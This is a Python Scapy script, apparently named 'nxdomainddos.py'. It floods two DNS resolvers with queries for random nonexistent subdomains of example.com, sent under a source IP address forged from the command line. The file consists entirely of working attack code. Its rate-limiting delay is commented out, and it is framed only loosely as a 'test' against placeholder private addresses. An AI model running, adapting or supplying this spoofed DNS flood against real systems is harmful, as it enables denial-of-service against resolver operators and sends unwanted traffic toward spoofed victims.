import sys
from scapy.all import IP, UDP, DNS, DNSQR, send
import random
import string
import logging
import time
import os

# Suppress Scapy warnings (often related to IPv6 or interfaces)
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)


TARGET_RESOLVER_IPS = ['10.0.0.1', '10.0.1.1']
NUM_QUERIES = 1000
BASE_DOMAIN = 'example.com'

def generate_random_domain(length=3, base_domain=BASE_DOMAIN):
    #Generates a random N-letter subdomain of the base domain

    letters = string.ascii_lowercase
    subdomain = ''.join(random.choice(letters) for i in range(length))
    return f"{subdomain}.{base_domain}"

def run_dns_spoof_test(source_ip):
    #Generates and sends DNS queries with a spoofed source IP
    
    print(f"--- DNS Query Generation Started ---")
    print(f"Target Resolvers: {TARGET_RESOLVER_IPS[0]}, {TARGET_RESOLVER_IPS[1]}")
    print(f"Source IP: {source_ip}")
    print(f"Number of Queries: {NUM_QUERIES}")
    print("-" * 35)

    domain_list = []
    
    # Generate unique 3-letter subdomains
    while len(domain_list) < NUM_QUERIES:
        domain = generate_random_domain(length=3)
        if domain not in domain_list:
            domain_list.append(domain)
    
    print(f"Generated {len(domain_list)} unique domains.")

    # Iterate and send the packets
    packets_sent = 0
    start_time = time.time()
    
    for domain in domain_list:
        for resolver_ip in TARGET_RESOLVER_IPS:

            ip_layer = IP(src=source_ip, dst=resolver_ip)
            
            udp_layer = UDP(sport=random.randint(1025, 65535), dport=53)
            
            # Construct the DNS layer (Query type A, class IN, random transaction ID)
            dns_query = DNS(
                id=random.randint(10000, 60000), 
                qr=0,       # 0 for Query
                rd=1,       # Recursion desired
                qd=DNSQR(qname=domain, qtype='A', qclass='IN')
            )
            
            
            packet = ip_layer / udp_layer / dns_query
            
            send(packet, verbose=0)
            
            packets_sent += 1
            
            # Add a small delay if needed to prevent network saturation
            # time.sleep(0.001) 
            
            if packets_sent % 100 == 0:
                sys.stdout.write(f"\rPackets Sent: {packets_sent}/{NUM_QUERIES}")
                sys.stdout.flush()

    end_time = time.time()
    
    print("\n" + "-" * 35)
    print(f"Successfully sent {packets_sent} packets.")
    print(f"Total Time: {end_time - start_time:.2f} seconds.")
    print(f"Rate: {packets_sent / (end_time - start_time):.2f} packets/sec.")
    print("--- Execution Complete ---")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: sudo python3 nxdomainddos.py <source_ip>")
        print("Example: sudo python3 nxdomainddos.py 10.0.5.1")
        sys.exit(1)

    
    spoofed_source_ip = sys.argv[1]
    

    if os.geteuid() != 0:
        print("\nWARNING: Raw packet crafting requires root privileges.")
        print("If you encounter permission errors, please run with 'sudo'.")
        # Continue attempting to run, but inform the user of the requirement

    try:
        run_dns_spoof_test(spoofed_source_ip)
    except Exception as e:
        print(f"\nAn error occurred during execution: {e}")
        print("Please ensure 'scapy' is installed and you have root privileges.")
